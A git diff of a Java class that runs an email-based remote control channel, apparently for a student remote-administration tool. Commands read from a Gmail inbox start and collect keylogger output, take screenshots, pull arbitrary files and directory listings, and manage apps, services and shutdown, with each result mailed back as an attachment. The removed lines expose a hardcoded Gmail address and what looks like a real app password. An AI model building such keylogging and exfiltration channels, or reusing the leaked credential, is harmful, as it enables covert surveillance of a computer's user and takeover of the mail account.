@@ -16,13 +16,9 @@ import java.io.IOException;
 import java.util.*;
 
 public class MailServer {
-    static final String from = "qhuy.bui.contact@gmail.com";
-    static final String password = "tmxkdnhaahkkfkgl";
-    static final String userName = from;
     static final String protocol = "imap";
     static final String host = "imap.gmail.com";
     static final String getPort = "993";
-    private static Queue<String[]> requests = new LinkedList<>();
 
     public static boolean sendMail(String[] respondContent) {
         Properties props = new Properties();
@@ -36,12 +32,13 @@ public class MailServer {
         String subject = respondContent[1];
         String content = respondContent[2];
         String attachment_path = respondContent[3];
+        String attachment_name = respondContent[4];
 
         Authenticator auth = new Authenticator() {
             @Override
             protected PasswordAuthentication getPasswordAuthentication() {
                 // TODO Auto-generated method stub
-                return new PasswordAuthentication(from, password);
+                return new PasswordAuthentication(MainApplication.getInstance().getServerInfo().getKey(), MainApplication.getInstance().getServerInfo().getValue());
             }
         };
 
@@ -51,7 +48,7 @@ public class MailServer {
         try {
             // Header
             msg.addHeader("Content-type", "text/HTML; charset=UTF-8");
-            msg.setFrom(from);
+            msg.setFrom(MainApplication.getInstance().getServerInfo().getKey());
             msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to, false));
             msg.setSubject(subject);
 
@@ -65,7 +62,7 @@ public class MailServer {
                 BodyPart msgAttachment = new MimeBodyPart();
                 DataSource source = new FileDataSource(attachment_path);
                 msgAttachment.setDataHandler(new DataHandler(source));
-                msgAttachment.setFileName(attachment_path);
+                msgAttachment.setFileName(attachment_name);
                 multipart.addBodyPart(msgAttachment);
             }
 
@@ -117,7 +114,7 @@ public class MailServer {
 
         try {
             Store store = session.getStore(protocol);
-            store.connect(userName, password);
+            store.connect(MainApplication.getInstance().getServerInfo().getKey(), MainApplication.getInstance().getServerInfo().getValue());
 
             Folder folderInbox = store.getFolder("INBOX");
             folderInbox.open(Folder.READ_WRITE);
@@ -166,6 +163,7 @@ public class MailServer {
         String subjectReturn = "";
         String contentReturn = "";
         String attachmentReturn = "";
+        String attachmentName = "empty";
 
         // Input Variables
         String subjectInput = tmp[1];
@@ -184,6 +182,7 @@ public class MailServer {
                 contentReturn = "Fail to get apps list.";
             } else {
                 contentReturn = "Successfully get an apps list.";
+                attachmentName = "apps";
             }
 
         }else if (subjectInput.equals("get-services")) {
@@ -193,6 +192,7 @@ public class MailServer {
                 contentReturn = "Fail to get services list.";
             } else {
                 contentReturn = "Successfully get a services list.";
+                attachmentName = "services";
             }
 
         }else if (subjectInput.equals("start-app")) {
@@ -221,6 +221,7 @@ public class MailServer {
                 contentReturn = "Fail to capture a screenshot.";
             } else {
                 contentReturn = "Successfully get an screenshot.";
+                attachmentName = "screenshot";
             }
 
         }else if (subjectInput.equals("shutdown-server")) {
@@ -229,8 +230,11 @@ public class MailServer {
         }else if (subjectInput.equals("restart-server")) {
             contentReturn = MailServerHelpers.restartServer(contentInput);
 
-        }else if (subjectInput.equals("cancel-server-shutdown")) {
+        }else if (subjectInput.equals("cancel-shutdown")) {
             contentReturn = MailServerHelpers.cancelServerShutdown();
+
+        }else if (subjectInput.equals("logout-app")) {
+            MailServerHelpers.logoutServer();
 
         }else if (subjectInput.equals("start-keylogger")) {
             contentReturn = MailServerHelpers.startKeylogger();
@@ -242,6 +246,7 @@ public class MailServer {
                 contentReturn = "Fail to get keylogger result.";
             } else {
                 contentReturn = "Successfully get keylogger result.";
+                attachmentName = "keylogger";
             }
 
         }else if (subjectInput.equals("collect-file")) {
@@ -251,13 +256,45 @@ public class MailServer {
                 contentReturn = "Fail to get the file at: " + contentInput;
             } else {
                 contentReturn = "Successfully get the file at: " + contentInput;
+                attachmentName = "file-result";
             }
 
+        }else if(subjectInput.equals("get-directory")) {
+                attachmentReturn = MailServerHelpers.collectDirectory(contentInput);
+                if (attachmentReturn.isEmpty()) {
+                    contentReturn = "Fail to get the directory path: " + contentInput;
+                } else {
+                    contentReturn = "Successfully get the directory path: " + contentInput;
+                    attachmentName = "directory-result";
+                }
+
         }else {
-            contentReturn = "You have input the wrong command!" + " Here is the list of command you can try:";
+            contentReturn = "You have input the wrong command!\n" + " Here is the list of command you can try:\n" +
+                    "- Nhận danh sách Apps: [get-apps] []\n" +
+                    "- Khởi động Apps: [start-app] [địa chỉ file exe]\n" +
+                    "- Khởi động Apps lưu sẵn: [start-app-by-name] [tên app]\n" +
+                    "- Tắt Apps: [stop-app] [tên app]\n\n" +
+
+                    "- Nhận danh sách Services: [get-services] []\n" +
+                    "- Khởi động Service: [start-service] [tên service]\n" +
+                    "- Tắt Service: [stop-service] [tên service]\n\n"+
+
+                    "- Lấy Screenshot: [get-screenshot] []\n" +
+                    "- Khởi động Keylogger: [start-keylogger] []\n" +
+                    "- Tắt Keylogger: [stop-keylogger] []\n\n" +
+
+                    "- Lấy File: [collect-file] [địa chỉ file]\n" +
+                    "- In ra thư mục [get-directory] [địa chỉ folder]\n\n" +
+
+                    "- Tắt phần mềm: [logout-server] []\n"+
+                    "- Tắt máy tính: [shutdown-server] [thời gian delay theo s]\n" +
+                    "- Khởi động lại máy tính: [restart-server] [thời gian delay theo s]\n" +
+                    "- Dừng lệnh tắt máy tính: [cancel-shutdown] []\n\n"+
+
+                    "- Xem các chức năng: [help/ nhập bất kì] []\n";
         }
 
-        return new String[]{to, subjectReturn, contentReturn, attachmentReturn};
+        return new String[]{to, subjectReturn, contentReturn, attachmentReturn, attachmentName};
     }
 
     public static void main(String[] args) {}
